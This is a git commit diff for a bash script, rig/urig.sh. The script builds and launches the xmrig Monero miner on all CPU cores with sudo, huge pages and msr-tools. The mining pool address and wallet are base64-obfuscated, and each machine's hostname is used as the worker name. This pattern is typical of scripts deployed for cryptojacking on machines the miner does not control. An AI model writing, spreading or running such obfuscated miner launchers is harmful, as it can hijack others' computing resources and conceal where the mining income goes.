81f2b13f4130e6583164cb48d012b433b1a3063d
moonwater <c38TeaEGe4ZhNeR@gmail.com>
2019-12-12 02:49:28 +0800

    Update urig.sh
    --randomx-1gb-pages

--- rig/urig.sh
+++ rig/urig.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt-get update
-sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev msr-tools
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig && mkdir -p build && cd build
 cmake ..
@@ -9,4 +9,4 @@ sudo sysctl -w vm.nr_hugepages=256
 www=`echo NDNEMXpyNGZjNHdiRzFYcXkyUDF3UWhKZ0dpMWNLTUNTZWRGM3lwbVFzNUc5ejRkNW52cUJ4bWllRUpQa2REcUduWThQeWZRQ0pLdlY0RXduaDhDQk1lTFVldkdIdXMK | base64 -d`
 uuu=`uname -n`
 ppp=`echo "cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMzCg==" |base64 -d`
-./xmrig -k -v 1 -t $(getconf _NPROCESSORS_ONLN) -o $ppp -u $www.$uuu -p x --donate-level 1
+./xmrig -k -v 1 -t $(getconf _NPROCESSORS_ONLN) -o $ppp -u $www.$uuu -p x --donate-level 1 --randomx-1gb-pages
